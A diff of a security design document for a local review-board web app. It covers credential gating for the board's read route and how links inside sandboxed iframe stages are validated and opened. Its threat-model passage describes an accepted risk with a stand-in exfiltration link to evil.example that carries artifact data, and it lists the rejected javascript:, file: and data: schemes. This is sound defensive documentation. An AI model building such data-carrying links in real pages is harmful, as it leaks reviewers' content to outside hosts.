@@ -323,10 +323,12 @@ credential — the index, a board
 page, archive search, the blocking wait and the event stream alike. Not every one of those
 accepts the *same* credential, though: `GET /api/board/:id/wait` also writes — `handleWait`
 persists the board on its timeout branch and spends undelivered comments on every branch — so
-it is gated exactly like a write, the secret only, never the cookie alone; every other route in
-that list accepts either. (`/auth/<token>` is
-the route that *hands out* the credential, so it cannot require one; it is protected by
-the token being unguessable, single-use and seconds-lived. The third open route is the vendored mermaid
+it is gated exactly like a write, the secret only, never the cookie alone.
+`GET /api/board/:id/read` (ADR 115) is held to the secret alone for a different reason: it writes
+nothing, but its caller is a tool and never a page, and the session cookie is exactly the
+credential a cross-origin GET could ride in on. Every other route in that list accepts either.
+(`/auth/<token>` is the route that *hands out* the credential, so it cannot require one; it is
+protected by the token being unguessable, single-use and seconds-lived. The third open route is the vendored mermaid
 engine, and only that one name shape: the caller is a board page's own `html` stage, which is
 sandboxed with no `allow-same-origin` and so holds no credential by construction, and what the
 route hands back is a third-party library's public bytes under a name that is a digest of
@@ -486,6 +488,34 @@ no stage-to-parent message can select anything. The distinction this rests on is
 that is easy to lose: validating a message's origin and re-deriving its frame from the live
 DOM proves only that *a stage* sent it, never that *a human* did. A stage may propose (mint
 a comment); it may never decide.
+
+#### The one outbound path a stage has
+
+A link inside a stage is handled by the board, not by the frame (`ADR.md` entry 113): an
+in-page `#anchor` scrolls inside the frame, and an `http`/`https` address is posted to the
+board page as a `link` message, which the page opens in a new tab **at once**. That message is
+the only way anything a stage supplies ever leaves the machine, so the page validates before it
+opens: at most 4096 characters, **parsed** by `new URL` rather than pattern-matched, `http:` or
+`https:` only, and accepted only from a genuine stage (origin `null`, then `event.source`
+re-derived from the live DOM), like every other message on that channel. Every other scheme
+(`javascript:`, `file:`, `data:`, a relative path) opens nothing and navigates nothing.
+
+The tab is opened by the board page rather than from inside the frame: the sandbox keeps
+`allow-scripts` alone (no `allow-popups`), so the frame cannot open one at all, and
+`window.open(href, '_blank', 'noopener')` is what stops the opened page reaching back through
+`window.opener` into a board that holds every answer on it. The reviewer's click inside the
+frame gives the ancestor document its user activation, so this is an open the popup blocker
+lets through; a `link` posted by a stage's own script with no click behind it has no activation
+to spend and meets that blocker.
+
+**The risk this accepts**: an address is a channel. A hostile stage script can read nothing
+outside its own document, but it can compose `https://evil.example/?d=<whatever the artifact
+itself carries>`, dress it as an ordinary link, and have that address open on the reviewer's
+click before they read where it went. The address is not shown or confirmed first, by decision:
+Chrome's own hover bubble already names a link's target, and the artifacts this board shows are
+the ones its own agent authored. A strip showing the full address with Open and Dismiss was
+built and reverted for that reason; what it cost was one extra click per link. `PROTOCOL.md`,
+"Links inside a stage", carries the shapes and the validation rules.
 
 #### Your review content at rest
 
